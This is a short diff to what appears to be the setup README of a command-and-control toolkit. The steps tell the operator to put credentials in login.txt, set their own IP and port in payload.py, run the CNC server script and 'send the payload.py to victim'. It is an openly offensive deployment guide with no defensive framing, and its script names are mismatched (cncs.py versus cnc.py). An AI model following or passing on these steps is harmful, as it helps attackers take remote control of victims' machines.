@@ -1,7 +1,7 @@
 # 1. Change login.txt username and password (eg. XBDM test)
 
-# 2. Change cncs.py ip and port.
+# 2. Change payload.py to your ip and port.
 
-# 3. Run cnc.py with port (eg. python3 cnc.py 101) on client device.
+# 3. Run cncs.py with port (eg. python3 cnc.py 909) on client device.
 
-# 4. Run cncs.py on client device.
+# 4. Send the payload.py to victim
